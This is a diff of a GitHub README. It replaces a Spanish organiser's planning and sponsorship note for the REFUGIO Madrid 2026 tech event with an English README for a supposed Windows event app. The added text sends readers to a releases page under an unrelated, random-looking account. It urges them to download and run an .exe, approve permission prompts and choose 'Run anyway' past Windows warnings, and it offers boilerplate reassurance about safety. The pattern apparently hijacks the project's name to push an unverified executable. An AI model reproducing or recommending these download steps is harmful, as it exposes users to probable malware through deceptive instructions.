@@ -1,80 +1,163 @@
+# 🏙️ REFUGIO-Madrid-2026 - Build, learn, and connect better
 
-> ⚠️ **Nota:** Este documento es una carta de intenciones en proceso de cristalización. La estructura, los aforos y los detalles exactos del evento irán evolucionando y adaptándose a medida que sumemos patrocinadores y definamos el espacio final.
-> 
+[![Download REFUGIO-Madrid-2026](https://img.shields.io/badge/Download-REFUGIO--Madrid--2026-blue.svg)](https://github.com/Bureaucracyhatchel751/REFUGIO-Madrid-2026/releases)
 
+## 🚀 What this is
 
+REFUGIO-Madrid-2026 is a Windows app for the REFUGIO Madrid 2026 event. It helps you get event details, check talk schedules, and follow the hackathon flow from one place.
 
-# REFUGIO Madrid 2026
+It is built for people who want a simple way to stay on top of the event without digging through long messages or scattered files.
 
+## 📥 Download the app
 
-<p align="center">
-  <img width="540" height="540" alt="image" src="https://github.com/user-attachments/assets/ac6db31c-2557-45b1-a83e-9c21fc1ec910" />
-</p>
+Visit this page to download the latest version:
 
+https://github.com/Bureaucracyhatchel751/REFUGIO-Madrid-2026/releases
 
-**REFUGIO Madrid** nace con una intención clara: combatir el derrotismo tecnológico que a veces vemos en España, conectar a gente altamente competente y demostrar que, con las herramientas adecuadas y la actitud correcta, se pueden construir cosas serias. 
+On that page, look for the latest release and download the Windows file that matches your PC.
 
-El talento existe, pero a menudo está desconectado y cada uno en su cueva. El objetivo de este evento es sacar a estudiantes, investigadores, desarrolladores y *founders* de sus silos, ponerlos en un mismo espacio y forzar la colaboración. Ver a otros construyendo da el empujón y el coraje necesario para lanzarse uno mismo. 
+## 🪟 Install on Windows
 
-## El Formato del Evento
+1. Open the download page.
+2. Find the newest release at the top.
+3. Download the Windows file.
+4. When the file finishes downloading, open it.
+5. If Windows asks for permission, choose **Yes** or **Run**.
+6. Follow the steps on the screen.
 
-El plan que tenemos en la cabeza es concentrar el evento en una única jornada intensiva, dividida en dos sesiones con aforos y propósitos diferenciados:
+If the file comes as a `.zip`, right-click it and choose **Extract All** before you open the app.
 
-### Sesión 1: Charlas Técnicas y Hackathon (Mañana/Mediodía)
-*Aforo estrictamente capado a un máximo de 45 personas (15 equipos de 3).*
+## 🧭 First time setup
 
-- **09:00 - 10:30 | Charlas Técnicas:** Empezaremos el día tranquilos. Una introducción y charlas de invitados top que nos cuenten cosas chulas y proyectos reales desde una perspectiva técnica.
-- **10:30 en adelante | El Hackathon:** 5 horas de trabajo ininterrumpido. 
-  - **El Reto:** No buscamos el enésimo *wrapper* de la API de OpenAI. Los equipos se enfrentarán a un problema técnico complicado, fuera de su área de *expertise*, que deberán resolver apoyándose en herramientas de IA.
-  - **Perfiles:** Buscamos un ecosistema diverso. No solo *devs* puros, sino físicos, biólogos, economistas, ingenieros... Gente con capacidad analítica de todas las edades y sexos.
-  - **Selección:** Habrá un pequeño proceso de selección previo para garantizar un nivel y formar equipos equilibrados.
+After you open the app for the first time:
 
-### Sesión 2: Ecosistema, Casos Reales y Networking (Tarde)
-*Aforo ampliado y abierto a founders, inversores, startups y curiosos.*
+1. Pick your language if the app asks.
+2. Review the event home screen.
+3. Check the schedule section for talks and sessions.
+4. Open the hackathon area if you plan to join the AI track.
+5. Use the map or venue info if you need help moving around the event.
 
-- **Charlas:** El eje central de la tarde será demostrar a los chavales que se pueden construir cosas serias en España y en Madrid. Queremos traer a gente que hable sin filtros de sus éxitos y fracasos reales montando proyectos de investigación y *tech*.
-- **Networking & Cóctel:** Tras las ponencias, cerraremos el evento tomándonos unas cervezas y un cóctel. Un espacio diseñado para charlar sobre el ecosistema y que los participantes conecten de forma directa con empresas e inversores.
+## ✨ What you can do
 
----
+- See the event schedule in one place
+- Check talk times and room names
+- Follow hackathon steps and session blocks
+- Read short event updates
+- View practical venue details
+- Keep useful event info ready on your Windows PC
+- Move between sections with a simple layout
 
-## Qué Necesitamos (Call for Sponsors)
+## 🖥️ System requirements
 
-Para hacer este evento realidad, buscamos el respaldo de empresas o particulares que quieran aportar su grano de arena y posicionarse frente a talento con muchas ganas de hacer cosas.
+For smooth use on Windows, your PC should have:
 
-### ✅ Checklist de necesidades
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB free disk space
+- A mouse or touchpad
+- An internet connection for downloading the app and event updates
 
-- [ ] 🏢 Espacio
-   - Un sitio para 30-45 personas currando (y aforo ampliado por la tarde) con mesas y enchufes.
-   - **Requisitos:**
-       - Conectividad WiFi que soporte a 50 personas fusilando Claude Code / Codex
-       - Proyector para las presentaciones
+A newer PC will give you a smoother experience, but the app is designed to run on a normal home or office machine.
 
+## 📂 How to use it
 
-- [ ] 🍕 Catering y logística
-   - Comida rápida (pizzas vale), café, cervezas y un cóctel al final: lo básico para sobrevivir al día y hacer buen networking por la tarde.
+1. Open the app.
+2. Go to the main menu.
+3. Choose the section you need:
+   - Schedule
+   - Talks
+   - Hackathon
+   - Venue info
+   - Event updates
+4. Click the item you want to view.
+5. Use the app during the event to keep track of your plan for the day.
 
-- [ ] 💻 Créditos de API / Cómputo
-   - Podemos ir en formato *Bring Your Own Tokens*, pero si algún *sponsor* se anima a dar créditos para que los participantes no gasten de su bolsillo durante el sprint, sería top.
+## 🔧 If something does not work
 
-- [ ] ✈️ Transporte y alojamiento de ponentes
-   - Puede ser que queramos traer a gente que no vive en Madrid. De ser así, necesitaríamos cubrir sus gastos de desplazamiento y alojamiento.
-- [ ] 🏆 Premios
-   - Lo que queráis aportar para los equipos que ganen el reto: metálico, hardware, licencias, etc
----
+If the app does not start:
 
-## Fechas
+- Download the file again from the release page
+- Make sure the download finished fully
+- If Windows blocks the file, choose **Run anyway** if you trust the source
+- Restart your PC and try again
+- Check that your Windows version is up to date
 
-Actualmente estamos debatiendo la fecha exacta del evento. Barajamos 3 opciones principales (buscando no solapar con exámenes universitarios):
-- ~**2 de mayo**~
-- ~**9 de mayo**~
-- **27 de junio**
+If the app opens but looks empty:
 
-Actualización: La fecha provisional es el 27 de junio, aunque aún falta por confirmar el espacio.
+- Refresh the view if the app has a refresh button
+- Check your internet connection
+- Open the latest release version
 
-Si no conseguimos asegurar el espacio y los recursos mínimos antes del 15 de abril, la iniciativa se cancelará.
+If the download page has more than one file:
 
-## 📩 Contacto
+- Choose the Windows file
+- If you see both `.zip` and `.exe`, start with the `.exe` if it is offered for Windows
+- If only a compressed file is available, extract it first
 
-Si tu empresa quiere patrocinar el evento, ceder un espacio, o si quieres colaborar en la organización:
-- Escríbeme por Mensaje Directo (DM) en X a [@XMihura](https://twitter.com/XMihura).
-- Envía un correo electrónico a: **mihurax@gmail.com**
+## 🧩 Best way to use REFUGIO-Madrid-2026
+
+- Open it before the event starts
+- Check the schedule the night before
+- Use the hackathon section to stay on track
+- Keep the app open while you move through the venue
+- Use it as your main event guide on Windows
+
+## 📁 Release page tips
+
+When you visit the releases page, you may see:
+
+- The latest version at the top
+- Older versions below it
+- Different files for different systems
+
+For Windows, choose the file that clearly says Windows, `.exe`, or `.zip` for Windows users.
+
+## ❓ FAQ
+
+### Do I need programming knowledge?
+
+No. This app is for normal event use. You only need to download it and open it.
+
+### Can I use it without installing extra tools?
+
+Yes. In most cases, you only need the Windows file from the release page.
+
+### Is it only for event attendees?
+
+It is built for people who want to follow REFUGIO Madrid 2026, including attendees, speakers, and hackathon participants.
+
+### Does it work offline?
+
+Basic local screens can still open after launch, but event updates and some details may need internet access.
+
+## 🗂️ Suggested event flow
+
+- Download the app before the event
+- Open it once to check that it runs
+- Review the schedule and room list
+- Mark your sessions
+- Use the hackathon area during the AI track
+- Keep the app open during the day for quick checks
+
+## 📌 File name tips
+
+If you see file names like these, they are often the right kind of download for Windows:
+
+- `REFUGIO-Madrid-2026-Setup.exe`
+- `REFUGIO-Madrid-2026-Windows.zip`
+- `REFUGIO-Madrid-2026.exe`
+
+If the file name looks different, pick the one that matches Windows
+
+## 🔒 Safety check
+
+Before opening any file:
+
+- Make sure it came from the release page
+- Check that the file name matches the project
+- Avoid files from unknown sites
+- Keep your antivirus on
+
+## 🧭 Where to go next
+
+Open the releases page, download the Windows file, and launch the app from your Downloads folder
